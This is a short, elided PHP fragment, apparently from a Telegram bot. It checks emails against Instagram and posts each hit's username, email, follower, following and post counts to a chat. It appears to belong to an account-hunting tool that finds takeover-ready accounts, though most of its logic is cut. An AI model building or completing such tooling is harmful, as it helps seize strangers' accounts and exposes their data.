                    ...
                    if(checkMail($mail)){
                        ...
                        if ($inInsta !== false) {
                            // if($config['filter'] <= $follow){
                                ...
                                $following = $info['ff'];
                                $media = $info['m'];
                                bot('sendMessage', ['disable_web_page_preview' => true, 'chat_id' => $id, 'text' => "• Hi sajad New Email ⚠️•━•━•━•━•━•━•━•━•━•━•- ❖ UserName : $username - ❖ Email : $email - ❖ Followers : $followers- ❖ Following : $following- ❖ Post : $posts •━•━•━•━•━•━•━•━•━•━•• || @YYYhYY & @o4abot || • ",
